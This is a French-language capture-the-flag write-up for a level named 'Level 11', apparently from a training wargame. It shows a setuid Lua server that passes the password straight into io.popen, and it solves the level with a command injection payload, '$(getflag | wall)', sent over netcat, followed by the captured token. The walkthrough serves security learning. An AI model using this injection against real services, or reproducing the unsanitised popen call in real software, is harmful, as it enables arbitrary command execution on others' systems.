# Level 11

Home structure
```
$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
Le script lua, va ecouter sur le port `5151` et demande un mot de passe mais le plus important c'est la fonction de hash pour le mot de passe. On voit qu'il utilise `popen` de lib io. Ce que fait `popen`, est de tout simplement exécuter le premier paramètre dans bash (Comme dans `system()`).
<br/>
Ce qui voudrait dire qu'on pourrait exécuter n'importe quel commande via le paramètre pass de la fonction `hash`.
```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
...
```
On se connecte donc via `netcat`, il nous demande un mot de passe et on lui donne la command à exécuter dans un sous shell et le broadcast à tous les users.

```
$ nc 127.0.0.1 5151
Password: $(getflag | wall)

Broadcast Message from flag11@Snow
        (somewhere) at 15:32 ...

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Erf nope..
```
